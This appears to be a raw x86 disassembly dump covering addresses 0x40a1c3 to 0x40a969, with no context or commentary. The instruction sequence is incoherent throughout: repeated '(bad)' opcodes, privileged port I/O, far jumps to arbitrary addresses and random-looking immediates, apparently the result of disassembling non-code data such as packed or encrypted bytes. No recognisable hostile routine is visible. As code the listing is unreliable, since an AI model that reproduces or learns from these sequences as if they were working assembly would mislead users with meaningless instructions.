  40a1c3:	pusha  
  40a1c4:	(bad)  
  40a1c5:	xor    eax,0xf08d513f
  40a1ca:	adc    ebx,ebx
  40a1cc:	mov    eax,0xf914755d
  40a1d1:	add    ah,cl
  40a1d3:	test   BYTE PTR [edi-0x71],dl
  40a1d6:	ja     0x40a22a
  40a1d8:	test   DWORD PTR [edi+ebp*8-0x14badb15],edx
  40a1df:	jp     0x40a1b3
  40a1e1:	cmp    eax,0xc3a915df
  40a1e6:	xchg   esi,eax
  40a1e7:	cmc    
  40a1e8:	clc    
  40a1e9:	cmp    al,BYTE PTR [ebp+0x730c51b7]
  40a1ef:	(bad)  
  40a1f0:	enter  0xa0d1,0x26
  40a1f4:	push   eax
  40a1f5:	lds    esp,FWORD PTR [edx-0x4502c224]
  40a1fb:	jge    0x40a205
  40a1fd:	push   0xf77e3f5f
  40a202:	les    ecx,FWORD PTR [ebx+0x53]
  40a205:	cmp    al,0x79
  40a207:	push   eax
  40a208:	sbb    bh,BYTE PTR [edx+0x16a2e96]
  40a20e:	push   edx
  40a20f:	aas    
  40a210:	call   FWORD PTR [esi*1+0x23c337db]
  40a217:	repnz adc al,0x37
  40a21a:	sub    DWORD PTR [edi+0x7b],ecx
  40a21d:	push   es
  40a21e:	add    al,0x11
  40a220:	sbb    al,0x93
  40a222:	add    bh,ah
  40a224:	adc    ebx,DWORD PTR [ecx+0xb]
  40a227:	test   eax,0xd940d63f
  40a22c:	cmp    esp,ebx
  40a22e:	inc    ebp
  40a22f:	test   BYTE PTR [ebp-0xb],ch
  40a232:	int3   
  40a233:	pop    ds
  40a234:	push   0x1d
  40a236:	std    
  40a237:	or     al,BYTE PTR [eax-0x286c25a2]
  40a23d:	push   cs
  40a23e:	dec    esi
  40a23f:	(bad)  
  40a240:	ds inc ecx
  40a242:	mov    fs,WORD PTR [eiz*2+0x2b387756]
  40a249:	pushf  
  40a24a:	mov    ebx,0xd8ede66c
  40a24f:	das    
  40a250:	stc    
  40a251:	xor    DWORD PTR [esi+0x295c6465],esp
  40a257:	mov    cs:0xb040641d,eax
  40a25d:	xor    al,0xfd
  40a25f:	fisttp DWORD PTR [edi+ebp*2+0x63]
  40a263:	aad    0xad
  40a265:	inc    edi
  40a266:	mov    dh,0xc6
  40a269:	xor    al,BYTE PTR [esi-0x17]
  40a26c:	or     ah,ah
  40a26e:	aam    0x52
  40a270:	inc    esp
  40a271:	ret    0xe940
  40a274:	imul   eax,DWORD PTR [eax+0x49],0xffffffe8
  40a278:	xor    bl,BYTE PTR [esi-0x1cc4fa56]
  40a27e:	lea    ebx,[edi]
  40a280:	gs jo  0x40a22b
  40a283:	mov    dh,0x99
  40a285:	push   esi
  40a286:	inc    ebx
  40a287:	ret    0x9867
  40a28a:	rol    BYTE PTR [ebx-0x5ebd592e],1
  40a290:	loope  0x40a236
  40a292:	enter  0xff96,0x73
  40a296:	dec    ebx
  40a297:	jne    0x40a2bb
  40a299:	or     al,0x13
  40a29b:	in     eax,dx
  40a29c:	mov    ebp,DWORD PTR [ebx+eiz*4]
  40a29f:	jno    0x40a251
  40a2a1:	iret   
  40a2a2:	add    DWORD PTR [esi-0x1],edi
  40a2a5:	push   eax
  40a2a6:	or     al,0x21
  40a2a8:	push   esi
  40a2a9:	pop    eax
  40a2aa:	out    dx,al
  40a2ab:	stos   DWORD PTR es:[edi],eax
  40a2ac:	mov    esp,0xa5f93e7e
  40a2b1:	jnp    0x40a2af
  40a2b3:	mov    bh,0xf4
  40a2b5:	cs (bad) 
  40a2b8:	cmp    al,0xb4
  40a2ba:	sti    
  40a2bb:	pop    ebp
  40a2bc:	sbb    BYTE PTR gs:[edx+ebx*2],dh
  40a2c0:	adc    bh,BYTE PTR [ebx-0x344f83fd]
  40a2c6:	or     BYTE PTR [ecx],0xf2
  40a2c9:	ret    
  40a2ca:	vprotd ymm12,xmm4,0x66
  40a2cf:	outs   dx,BYTE PTR ds:[esi]
  40a2d0:	add    BYTE PTR [ebp+0x550b1f63],bl
  40a2d6:	dec    ebp
  40a2d7:	rcr    BYTE PTR [ebx-0x354fabcb],0xd7
  40a2de:	mov    ch,0xeb
  40a2e0:	js     0x40a2c0
  40a2e2:	mov    ds:0x66dc2173,eax
  40a2e7:	jmp    0xcf9df3b8
  40a2ec:	in     eax,dx
  40a2ed:	arpl   WORD PTR [edi+0x6a],ax
  40a2f0:	jp     0x40a367
  40a2f2:	xor    eax,0xb0344b2
  40a2f7:	xor    al,0x81
  40a2f9:	rcl    DWORD PTR [ebp+ecx*2-0x4daf21f5],1
  40a300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a301:	int    0x15
  40a303:	add    esi,DWORD PTR [ecx+0x42f78279]
  40a309:	scas   al,BYTE PTR es:[edi]
  40a30a:	xor    cl,BYTE PTR [ebp-0x71]
  40a30d:	inc    ebx
  40a30e:	mov    ds:0x4127bd81,eax
  40a313:	addr16 ret 
  40a315:	and    ebx,esi
  40a317:	jmp    0x94c67fd5
  40a31c:	cdq    
  40a31d:	in     al,0xaa
  40a31f:	scas   eax,DWORD PTR es:[edi]
  40a320:	in     eax,0x52
  40a322:	sbb    dh,BYTE PTR [ebp+ebp*8-0x50]
  40a326:	push   es
  40a327:	and    al,0xad
  40a329:	or     ch,ah
  40a32b:	sub    al,0x15
  40a32d:	fisub  DWORD PTR [ecx]
  40a32f:	scas   al,BYTE PTR es:[edi]
  40a330:	dec    ecx
  40a331:	mov    ebp,0x7d382cf0
  40a336:	jns    0x40a2ec
  40a338:	pop    ss
  40a339:	aas    
  40a33a:	xor    bl,0x89
  40a33d:	je     0x40a2ff
  40a33f:	enter  0x2e7c,0x1f
  40a343:	not    DWORD PTR [ebp+0x5c]
  40a346:	in     al,dx
  40a347:	mov    esp,0x6ebb2097
  40a34c:	add    al,bl
  40a34e:	add    eax,0x9012ab96
  40a353:	idiv   dl
  40a355:	in     al,0x44
  40a357:	and    BYTE PTR [esp+ebx*4+0x67a640b0],cl
  40a35e:	push   es
  40a35f:	push   esi
  40a360:	sar    BYTE PTR [esi+0x40f4d044],1
  40a366:	mov    ebp,0xa8cdce2f
  40a36b:	lock sbb eax,ebx
  40a36e:	xchg   ebp,eax
  40a36f:	push   eax
  40a370:	arpl   WORD PTR [eax-0x43],cx
  40a373:	dec    ecx
  40a374:	gs mov esi,edi
  40a377:	push   0xefc7e843
  40a37c:	rcr    BYTE PTR [eax+0x45],cl
  40a37f:	loopne 0x40a36c
  40a381:	les    ecx,FWORD PTR [eax+edx*2-0x73]
  40a385:	sbb    DWORD PTR [ebx],ecx
  40a387:	xchg   ebx,eax
  40a388:	lods   eax,DWORD PTR ds:[esi]
  40a389:	aad    0xe2
  40a38b:	mov    esi,0xc5b21d83
  40a390:	dec    edx
  40a391:	fs (bad) 
  40a393:	adc    BYTE PTR cs:[ebx-0x3c886dbd],bl
  40a39a:	xor    esp,DWORD PTR [ebx+0x2cb5aaeb]
  40a3a0:	pop    ebx
  40a3a1:	inc    eax
  40a3a2:	jne    0x40a3da
  40a3a4:	dec    ebx
  40a3a5:	scas   eax,DWORD PTR es:[edi]
  40a3a6:	mov    esi,0x8170a011
  40a3ab:	loop   0x40a390
  40a3ad:	sbb    eax,0x5e54269f
  40a3b2:	cmp    ah,bl
  40a3b4:	fs in  eax,dx
  40a3b6:	fcmove st,st(4)
  40a3b8:	icebp  
  40a3b9:	jge    0x40a351
  40a3bb:	mov    ds:0x288c5814,eax
  40a3c0:	sahf   
  40a3c1:	mov    bl,0x2d
  40a3c3:	in     al,0x7a
  40a3c5:	jecxz  0x40a37a
  40a3c7:	cmp    DWORD PTR [edx-0x59],ebx
  40a3ca:	imul   ebp,DWORD PTR [ebx-0x1b],0xffffffe7
  40a3ce:	(bad)  
  40a3cf:	xchg   edx,eax
  40a3d0:	adc    eax,0x225fc620
  40a3d5:	std    
  40a3d6:	mov    DWORD PTR [edi+esi*8+0x1f],eax
  40a3da:	rol    DWORD PTR [edi+0x2681db6],1
  40a3e0:	fdiv   DWORD PTR [ebx-0x11e7b43b]
  40a3e6:	fdivr  st,st(2)
  40a3e8:	and    esi,esp
  40a3ea:	out    0xe7,al
  40a3ec:	add    ebx,eax
  40a3ee:	add    bh,BYTE PTR [ebp-0x1c471a23]
  40a3f4:	sahf   
  40a3f5:	mov    eax,ds:0x8ac4abd4
  40a3fa:	imul   ebx,DWORD PTR [ebp+0x5e],0xffffffe8
  40a3fe:	ret    0x5985
  40a401:	test   al,0xb9
  40a403:	fwait
  40a404:	xor    al,0xe2
  40a406:	jb     0x40a3ae
  40a408:	rol    BYTE PTR [esi],1
  40a40a:	and    ah,BYTE PTR [edx-0x7d76841d]
  40a410:	jmp    0x7e52:0xf025a2f6
  40a417:	in     eax,dx
  40a418:	or     ecx,ecx
  40a41a:	stos   DWORD PTR es:[edi],eax
  40a41b:	data16 js 0x40a407
  40a41e:	sub    cl,BYTE PTR [ebp-0x5b1736a9]
  40a424:	stc    
  40a425:	(bad)  
  40a426:	xchg   ecx,eax
  40a427:	jg     0x40a49b
  40a429:	sbb    eax,0x45d17a0
  40a42e:	mov    dh,0xa4
  40a430:	add    al,dh
  40a432:	sar    BYTE PTR [edx+0x78de3e2f],cl
  40a438:	sbb    ecx,DWORD PTR [edx+ecx*1-0xb]
  40a43c:	xchg   ebx,eax
  40a43d:	mov    al,0x48
  40a43f:	adc    DWORD PTR ds:0x55cb6916,0xffffff84
  40a446:	push   edi
  40a447:	pop    ebp
  40a448:	lock jo 0x40a4c3
  40a44b:	inc    esi
  40a44c:	jge    0x40a456
  40a44e:	sbb    al,0x4c
  40a450:	call   FWORD PTR [eax+0x4c]
  40a453:	call   0x1aac:0xe0c8a2bf
  40a45a:	das    
  40a45b:	cli    
  40a45c:	(bad)  
  40a45d:	mov    cl,0xad
  40a45f:	sub    bl,BYTE PTR [ebp-0x37]
  40a462:	mov    ebx,0x41b60c1c
  40a467:	pop    es
  40a468:	and    al,0x23
  40a46a:	je     0x40a4ac
  40a46c:	out    0x8c,al
  40a46e:	pop    edi
  40a46f:	cwde   
  40a470:	mov    edx,0xe4bca8c2
  40a475:	rcl    BYTE PTR [eax+0x38],1
  40a478:	xchg   esi,eax
  40a479:	push   esp
  40a47a:	(bad)  
  40a47b:	loope  0x40a459
  40a47d:	xchg   DWORD PTR [ebx-0x70],edi
  40a480:	mov    bl,0xab
  40a482:	jmp    0x624d8789
  40a487:	addr16 jo 0x40a4e6
  40a48a:	adc    eax,0xa0b452
  40a48f:	popf   
  40a490:	and    esp,DWORD PTR [esi+0x1d99c846]
  40a496:	into   
  40a497:	(bad)  [ecx+esi*2-0x1afc79cd]
  40a49e:	fwait
  40a49f:	jg     0x40a504
  40a4a1:	jmp    0x5a032ef0
  40a4a6:	fbstp  TBYTE PTR [eax]
  40a4a8:	xchg   ebx,eax
  40a4a9:	cmp    DWORD PTR [edi+0x51],0x507559fc
  40a4b0:	pop    es
  40a4b1:	imul   ebp,DWORD PTR [eax+ebp*1-0x77a6eb92],0x70
  40a4b9:	outs   dx,DWORD PTR ds:[esi]
  40a4ba:	or     eax,0x5902f9ad
  40a4bf:	adc    DWORD PTR [ecx],0xffffffaa
  40a4c2:	mov    ds:0xab3b2ff4,al
  40a4c7:	mov    BYTE PTR [edi+0x3c4f98c5],al
  40a4cd:	mov    esi,0xa669fad9
  40a4d2:	sbb    al,0x22
  40a4d4:	adc    al,0x55
  40a4d6:	adc    BYTE PTR [eax],dl
  40a4d8:	(bad)  
  40a4d9:	and    eax,0x19af7bb1
  40a4de:	jle    0x40a4fe
  40a4e0:	xor    eax,0x81e1f56a
  40a4e5:	and    al,0x22
  40a4e7:	jbe    0x40a511
  40a4e9:	shr    edi,0xc6
  40a4ec:	les    esi,FWORD PTR [bx+si+0xa63]
  40a4f1:	test   eax,0xb61e13e0
  40a4f6:	in     eax,dx
  40a4f7:	mov    ch,0x64
  40a4f9:	mov    ebx,0x2350d124
  40a4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4ff:	jae    0x40a54a
  40a501:	adc    DWORD PTR [eax+eiz*8-0x20],ecx
  40a505:	loop   0x40a4b2
  40a507:	adc    al,0xa8
  40a509:	cmp    BYTE PTR [ecx-0x73],0xb0
  40a50d:	cmc    
  40a50e:	mov    al,ds:0x15e38653
  40a513:	dec    esp
  40a514:	sub    DWORD PTR [edx+0x73],0xffffffbf
  40a518:	lahf   
  40a519:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a51a:	or     al,0xca
  40a51c:	xchg   ebp,ecx
  40a51e:	in     eax,dx
  40a51f:	rol    esp,cl
  40a521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a522:	cmc    
  40a523:	ficom  DWORD PTR [eax-0x378ad548]
  40a529:	es cli 
  40a52b:	das    
  40a52c:	jne    0x40a4ea
  40a52e:	fwait
  40a52f:	mov    dl,0x6c
  40a531:	mov    eax,DWORD PTR [esi-0x24]
  40a534:	and    al,0x55
  40a536:	lock adc eax,0x7f4eb16
  40a53c:	test   BYTE PTR [ecx-0x76d9269b],ch
  40a542:	sbb    al,0x75
  40a544:	mov    ebp,0x3fb718e0
  40a549:	or     al,0x95
  40a54b:	jg     0x40a58a
  40a54d:	(bad)  
  40a54e:	out    dx,eax
  40a54f:	shl    DWORD PTR [ebx-0x6fadb9a1],0x19
  40a556:	enter  0xe244,0xdb
  40a55a:	and    ecx,DWORD PTR [ecx-0x46]
  40a55d:	daa    
  40a55e:	inc    eax
  40a55f:	les    edx,FWORD PTR [edi+0x29]
  40a562:	xor    dh,BYTE PTR [ebp+0x56]
  40a565:	mov    ecx,0x934d949e
  40a56a:	addr16 xchg ebp,eax
  40a56c:	xchg   DWORD PTR ds:0x9ccf7a97,eax
  40a572:	mov    ch,0xed
  40a574:	jg     0x40a5b0
  40a576:	xchg   BYTE PTR [ebp-0x509e26fe],ah
  40a57c:	cmp    ebx,DWORD PTR [eax+0x1a1ad5e6]
  40a582:	mov    dl,0xce
  40a584:	repnz pop ebp
  40a586:	stc    
  40a587:	pop    esi
  40a589:	stos   BYTE PTR es:[edi],al
  40a58a:	call   0x12ef2c07
  40a58f:	mov    eax,ds:0x265bd925
  40a594:	mov    dl,0xce
  40a596:	jnp    0x40a5e0
  40a598:	cmp    DWORD PTR [edx],ebp
  40a59a:	sbb    al,0x5f
  40a59c:	pop    edx
  40a59d:	sbb    BYTE PTR [eax-0x57a567c1],ah
  40a5a3:	test   eax,0xed3cc9a1
  40a5a8:	fsubr  QWORD PTR [ecx]
  40a5aa:	pushw  ss
  40a5ac:	add    esp,esp
  40a5ae:	and    DWORD PTR [edi],eax
  40a5b0:	sbb    eax,0x42d3426e
  40a5b5:	push   edx
  40a5b6:	sbb    edx,DWORD PTR [ebx]
  40a5b8:	push   ss
  40a5b9:	loopne 0x40a578
  40a5bb:	ins    DWORD PTR es:[edi],dx
  40a5bc:	sbb    al,0x2c
  40a5be:	ret    0x6312
  40a5c1:	xchg   ebp,eax
  40a5c2:	stos   DWORD PTR es:[edi],eax
  40a5c3:	pop    ebx
  40a5c4:	jbe    0x40a5b5
  40a5c6:	mov    esi,0xa8cbe56d
  40a5cb:	loope  0x40a578
  40a5cd:	jbe    0x40a5cc
  40a5cf:	mov    cl,0xe3
  40a5d1:	xchg   ebp,eax
  40a5d2:	mov    edx,0x9bbb8d8a
  40a5d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5d8:	aam    0x12
  40a5da:	xchg   DWORD PTR [edx],esp
  40a5dc:	or     BYTE PTR [ecx-0x150eb7e5],dl
  40a5e2:	popa   
  40a5e3:	add    esi,DWORD PTR [ecx]
  40a5e5:	imul   ebp,DWORD PTR [ebx+0x58],0x4f
  40a5e9:	inc    edx
  40a5ea:	and    al,0x7f
  40a5ec:	xchg   edi,eax
  40a5ed:	scas   eax,DWORD PTR es:[edi]
  40a5ee:	fsub   st(0),st
  40a5f0:	ret    0xba0e
  40a5f3:	mov    ebp,0x73b7b0ce
  40a5f8:	or     ah,bh
  40a5fa:	out    0xf5,al
  40a5fc:	push   esi
  40a5fd:	jle    0x40a5bc
  40a5ff:	mov    eax,0xdef84a74
  40a604:	mov    al,0x46
  40a606:	aas    
  40a607:	ss dec edi
  40a609:	xchg   ebp,eax
  40a60a:	adc    BYTE PTR [edx+0x3f],ch
  40a60d:	and    eax,0xdeb5e838
  40a612:	mov    ch,0x2
  40a614:	pop    ecx
  40a615:	pop    ds
  40a616:	nop
  40a617:	adc    al,0x10
  40a619:	rol    DWORD PTR [edx-0x80],cl
  40a61c:	gs jecxz 0x40a5db
  40a61f:	jo     0x40a606
  40a621:	ret    0x1a5c
  40a624:	jecxz  0x40a64a
  40a626:	and    ecx,DWORD PTR [edi]
  40a628:	mov    ds:0xb3b7941e,eax
  40a62d:	push   eax
  40a62e:	mov    ds:0x9e91afab,al
  40a633:	mov    dl,0x19
  40a635:	mov    edi,0xe70ff528
  40a63a:	lds    esi,FWORD PTR [esi+0x1e089284]
  40a640:	xchg   esp,eax
  40a641:	pop    esi
  40a642:	je     0x40a64f
  40a644:	imul   ebp,DWORD PTR [ebx],0x4c
  40a647:	inc    esp
  40a648:	bound  esi,QWORD PTR [ebx-0x68]
  40a64b:	ret    
  40a64c:	pushf  
  40a64d:	inc    eax
  40a64e:	cmc    
  40a64f:	rcl    DWORD PTR [edi],cl
  40a651:	jge    0x40a659
  40a653:	mov    BYTE PTR [eax],dh
  40a655:	push   0xb514e56b
  40a65a:	popf   
  40a65b:	ret    
  40a65c:	mov    dh,0x2b
  40a65e:	xor    BYTE PTR [edx+0x16],dh
  40a661:	mov    esp,0xd07b424c
  40a666:	aas    
  40a667:	push   es
  40a668:	cmp    BYTE PTR [ecx-0x15],0xd0
  40a66c:	shl    BYTE PTR [eax+ebp*4+0x34],cl
  40a670:	ins    DWORD PTR es:[edi],dx
  40a671:	aad    0x43
  40a673:	xchg   esi,eax
  40a674:	push   eax
  40a675:	add    eax,esi
  40a677:	adc    ecx,DWORD PTR [ebx-0x77]
  40a67a:	and    DWORD PTR [eax-0x77],ebp
  40a67d:	pusha  
  40a67e:	xchg   edi,eax
  40a67f:	emms   
  40a681:	sbb    ebp,DWORD PTR [esi]
  40a683:	dec    eax
  40a684:	(bad)  
  40a685:	and    DWORD PTR [edx+edi*4+0x42],edx
  40a689:	push   ebp
  40a68a:	sub    esi,DWORD PTR [eax-0x28]
  40a68d:	add    eax,0x818af7cb
  40a692:	jecxz  0x40a67a
  40a694:	sbb    DWORD PTR [esi],0xffffffb3
  40a697:	and    DWORD PTR [edi+0x7ea7a049],edx
  40a69d:	push   ebx
  40a69e:	xchg   edi,eax
  40a69f:	aas    
  40a6a0:	cmp    BYTE PTR [ebp+0xb],dl
  40a6a3:	imul   ebp,eax,0x7d
  40a6a6:	sbb    al,0x33
  40a6a8:	pop    ecx
  40a6a9:	ficomp WORD PTR [edx]
  40a6ab:	rcl    DWORD PTR [edx],1
  40a6ad:	sub    eax,0xc7296a04
  40a6b2:	push   0xffffffb8
  40a6b4:	in     al,0x6b
  40a6b6:	ret    
  40a6b7:	rol    BYTE PTR ss:[ecx-0x52e9f02],1
  40a6be:	repz fist WORD PTR gs:[ebx+0x50]
  40a6c3:	not    DWORD PTR [ebp+0xa8ee1ea]
  40a6c9:	lods   eax,DWORD PTR ds:[esi]
  40a6ca:	xor    eax,0x9a8fe869
  40a6cf:	push   esi
  40a6d0:	inc    ebx
  40a6d1:	push   cs
  40a6d2:	push   ss
  40a6d3:	fist   WORD PTR [ebp+0x1827b6a2]
  40a6d9:	cwde   
  40a6da:	mov    ds:0x8081488e,al
  40a6df:	push   esi
  40a6e0:	fnstenv [ecx]
  40a6e2:	jl     0x40a726
  40a6e4:	aas    
  40a6e5:	dec    eax
  40a6e6:	lods   al,BYTE PTR ds:[esi]
  40a6e7:	aam    0x90
  40a6e9:	adc    DWORD PTR [edx-0x7c],edi
  40a6ec:	adc    BYTE PTR [edi+0x77],ah
  40a6ef:	inc    ebp
  40a6f0:	into   
  40a6f1:	out    dx,eax
  40a6f2:	or     edi,edi
  40a6f4:	xor    eax,ebx
  40a6f6:	shl    BYTE PTR [eax+0x5e444899],1
  40a6fc:	or     bl,bh
  40a6fe:	shl    BYTE PTR [ebp-0x5d6dbe33],0x8b
  40a705:	dec    ebp
  40a706:	jmp    0x6de395b0
  40a70b:	cmp    ebp,DWORD PTR [eax]
  40a70d:	stos   DWORD PTR es:[edi],eax
  40a70e:	cmp    eax,0xb0275232
  40a713:	mov    dl,0x95
  40a715:	jp     0x40a69b
  40a717:	cmp    BYTE PTR [edi-0x77de0b41],0x52
  40a71e:	cld    
  40a71f:	pop    ss
  40a720:	and    al,0x3f
  40a722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a723:	lds    ebx,FWORD PTR [edx]
  40a725:	jmp    0xb824:0x8624920c
  40a72c:	ds push edi
  40a72e:	xor    DWORD PTR [ebp-0x157caafc],ecx
  40a734:	xchg   ebp,eax
  40a735:	pop    ds
  40a736:	inc    ebx
  40a737:	cmc    
  40a738:	fcom   DWORD PTR [edx-0x47336f7f]
  40a73e:	scas   eax,DWORD PTR es:[edi]
  40a73f:	in     al,dx
  40a740:	jns    0x40a6c8
  40a742:	and    eax,0xf4a7983e
  40a747:	lods   al,BYTE PTR ds:[esi]
  40a748:	dec    esi
  40a749:	out    0x1,eax
  40a74b:	push   0x58900ae1
  40a750:	stc    
  40a751:	out    0x5,al
  40a753:	push   eax
  40a754:	test   DWORD PTR [edx+0x11],ecx
  40a757:	adc    ch,BYTE PTR ds:0x89a28f92
  40a75d:	pusha  
  40a75e:	ins    BYTE PTR es:[edi],dx
  40a75f:	int    0xeb
  40a761:	je     0x40a734
  40a763:	add    al,0xdc
  40a765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a766:	or     eax,0xb50f10d9
  40a76b:	shl    ch,cl
  40a76d:	push   ss
  40a76e:	test   BYTE PTR [eax],bl
  40a770:	sar    DWORD PTR [edx+ebp*4-0x719554a0],0x5d
  40a778:	dec    eax
  40a779:	clc    
  40a77a:	ret    
  40a77b:	test   BYTE PTR [ecx-0x560906b3],cl
  40a781:	dec    ebp
  40a782:	(bad)  
  40a783:	sub    BYTE PTR [eax-0x40],dl
  40a786:	cdq    
  40a787:	scas   al,BYTE PTR es:[edi]
  40a788:	jbe    0x40a7b0
  40a78a:	scas   eax,DWORD PTR es:[edi]
  40a78b:	xor    BYTE PTR [ebx-0x5b],dh
  40a78e:	int3   
  40a78f:	sbb    BYTE PTR [esi+edx*1],dh
  40a792:	ror    ebx,0xcf
  40a795:	pop    edx
  40a796:	sbb    ah,dh
  40a798:	xor    dh,BYTE PTR [eax+0x5c33037c]
  40a79e:	mov    esp,0xde4b6e58
  40a7a3:	call   0x5dbe:0x628b3a46
  40a7aa:	inc    edx
  40a7ab:	loope  0x40a805
  40a7ad:	mov    al,0x22
  40a7af:	jo     0x40a77b
  40a7b1:	(bad)  
  40a7b3:	and    ecx,DWORD PTR [ebx+edi*4+0x4]
  40a7b7:	inc    ecx
  40a7b8:	push   edx
  40a7b9:	xor    edx,DWORD PTR ds:0x692d7b8a
  40a7bf:	dec    edi
  40a7c0:	ins    BYTE PTR es:[edi],dx
  40a7c1:	jl     0x40a817
  40a7c3:	sub    eax,0xb7b9e334
  40a7c8:	xor    al,0xe1
  40a7ca:	gs cwde 
  40a7cc:	std    
  40a7cd:	out    dx,eax
  40a7ce:	mov    DWORD PTR ds:0x79e4faf5,edx
  40a7d4:	push   0x64
  40a7d6:	mov    bh,0xa4
  40a7d8:	xor    BYTE PTR [edi+0x2cc2aca6],bl
  40a7de:	sub    DWORD PTR [ebx],eax
  40a7e0:	pop    ecx
  40a7e1:	fisubr DWORD PTR [ebx]
  40a7e3:	arpl   WORD PTR [edx+ebp*4-0x36],dx
  40a7e7:	std    
  40a7e8:	addr16 pop edx
  40a7ea:	(bad)  
  40a7eb:	sub    DWORD PTR [esi+0x43],edi
  40a7ee:	mul    DWORD PTR [ebp+0x5f]
  40a7f1:	xor    eax,0xa47859
  40a7f6:	pop    eax
  40a7f7:	push   esi
  40a7f8:	stc    
  40a7f9:	add    eax,0x2ccc4c26
  40a7fe:	dec    edi
  40a7ff:	dec    ebp
  40a800:	gs sbb al,0x2d
  40a803:	leave  
  40a804:	rcr    DWORD PTR [edx+0x77b96aa1],1
  40a80a:	jne    0x40a7fc
  40a80c:	cmp    DWORD PTR [ecx+edx*1+0x4d],0x61e47497
  40a814:	mov    DWORD PTR [ebx+ecx*1],ebp
  40a817:	call   0x7b922bfd
  40a81c:	inc    edx
  40a81d:	pop    ds
  40a81e:	fucompp 
  40a820:	and    eax,ebx
  40a822:	pop    ebx
  40a823:	sub    ebp,DWORD PTR [edx-0x19]
  40a826:	xor    eax,0x8eacec1e
  40a82b:	mov    ?,WORD PTR [edx-0xb2b41a0]
  40a831:	mov    ds:0x59b9c52,eax
  40a836:	push   edi
  40a837:	push   cs
  40a838:	xchg   ecx,eax
  40a839:	and    eax,esp
  40a83b:	mov    ?,WORD PTR [edi-0x65]
  40a83e:	cdq    
  40a83f:	idiv   BYTE PTR [esi+eax*2]
  40a842:	xlat   BYTE PTR ds:[ebx]
  40a843:	mov    ecx,0xfeb97bba
  40a848:	mov    ecx,0x9582fce0
  40a84d:	inc    esp
  40a84e:	stc    
  40a84f:	fist   WORD PTR [ecx-0x3c]
  40a852:	mov    al,ds:0x582c8927
  40a857:	jne    0x40a7fa
  40a859:	jp     0x40a813
  40a85b:	mov    al,0xfa
  40a85d:	jbe    0x40a8dd
  40a85f:	pop    ds
  40a860:	pop    es
  40a861:	mov    esp,0xbcd41abd
  40a867:	loop   0x40a890
  40a869:	mov    ah,0x4d
  40a86b:	xchg   esp,eax
  40a86c:	jmp    0xeb03:0x5e682f37
  40a873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a874:	icebp  
  40a875:	out    0x5b,eax
  40a877:	mov    ecx,0xc55b8ae4
  40a87c:	xor    edx,DWORD PTR [eax+0x1a6927f5]
  40a882:	leave  
  40a883:	jo     0x40a8d3
  40a885:	sub    edx,DWORD PTR [edi+0x39]
  40a888:	test   eax,0x4398dedf
  40a88d:	mov    edi,0x8303d072
  40a892:	js     0x40a82e
  40a894:	inc    eax
  40a895:	pop    edx
  40a896:	xor    eax,0x59099301
  40a89b:	fdiv   DWORD PTR [edi+eax*8+0x51]
  40a89f:	rcr    BYTE PTR [eax+0x178ad380],1
  40a8a5:	mov    eax,0xedeb249b
  40a8aa:	stos   BYTE PTR es:[edi],al
  40a8ab:	inc    ecx
  40a8ac:	into   
  40a8ad:	test   al,0xed
  40a8af:	outs   dx,DWORD PTR ds:[esi]
  40a8b0:	cld    
  40a8b1:	adc    ebp,DWORD PTR [ebx]
  40a8b3:	xchg   ebp,eax
  40a8b4:	shl    BYTE PTR [ecx-0x22],cl
  40a8b7:	data16 fld st(5)
  40a8ba:	mov    esi,0xdfed46b0
  40a8bf:	out    0xdf,al
  40a8c1:	inc    eax
  40a8c2:	fistp  QWORD PTR [edi+edi*4]
  40a8c5:	cdq    
  40a8c6:	sar    BYTE PTR [edi-0x2db03b1b],1
  40a8cc:	xor    cl,bh
  40a8ce:	xchg   esp,eax
  40a8cf:	data16 xor dh,0xb1
  40a8d3:	ja     0x40a8ed
  40a8d5:	data16 mov ah,BYTE PTR [edi-0x932b03b]
  40a8dc:	in     al,dx
  40a8dd:	jae    0x40a889
  40a8df:	aad    0xf1
  40a8e1:	shl    DWORD PTR [edi-0x1f],0x1c
  40a8e5:	sbb    al,0x9c
  40a8e7:	std    
  40a8e8:	mov    al,0xf2
  40a8ea:	fdiv   DWORD PTR [esi]
  40a8ec:	arpl   ax,cx
  40a8ee:	lods   al,BYTE PTR ds:[esi]
  40a8ef:	retf   
  40a8f0:	in     al,0xe0
  40a8f2:	add    dh,bh
  40a8f4:	sub    BYTE PTR [ebp-0x18],dh
  40a8f7:	inc    edx
  40a8f8:	call   0xe92bb7fc
  40a8fd:	retf   
  40a8fe:	sub    esi,DWORD PTR [ecx]
  40a900:	adc    al,0xf7
  40a902:	and    esi,DWORD PTR [ecx+0x11]
  40a905:	cs add edx,ebx
  40a908:	xchg   DWORD PTR [eax+0x7c4b8190],edi
  40a90e:	sbb    eax,0x5c38f345
  40a913:	mov    ebp,0xac2eab49
  40a918:	inc    edx
  40a919:	daa    
  40a91a:	dec    ecx
  40a91b:	aam    0x12
  40a91d:	inc    esp
  40a91e:	jle    0x40a97b
  40a920:	ins    BYTE PTR es:[edi],dx
  40a921:	mov    esi,DWORD PTR [ebp*8-0x729e5407]
  40a928:	sub    DWORD PTR [ecx-0x8138239],edi
  40a92e:	fsubr  st,st(7)
  40a930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a931:	hlt    
  40a932:	std    
  40a933:	sar    al,cl
  40a935:	mov    ds:0xc2cbdce4,al
  40a93a:	sti    
  40a93b:	push   0x4a
  40a93d:	int3   
  40a93e:	daa    
  40a93f:	aad    0x59
  40a941:	pop    es
  40a942:	rol    cl,1
  40a944:	nop
  40a945:	inc    ebx
  40a946:	aas    
  40a947:	cmc    
  40a948:	dec    ecx
  40a949:	sub    eax,0xab9b1984
  40a94e:	fdivr  QWORD PTR [edi]
  40a950:	and    al,0x3c
  40a952:	sbb    ah,BYTE PTR [edi+esi*4+0x2cafbfe4]
  40a959:	rol    DWORD PTR [edx],1
  40a95b:	adc    ebp,DWORD PTR [esi-0x331b27ae]
  40a961:	cwde   
  40a962:	mov    eax,ds:0x36b24360
  40a967:	int3   
  40a968:	inc    esp
  40a969:	xchg   BYTE PTR [edx],ah
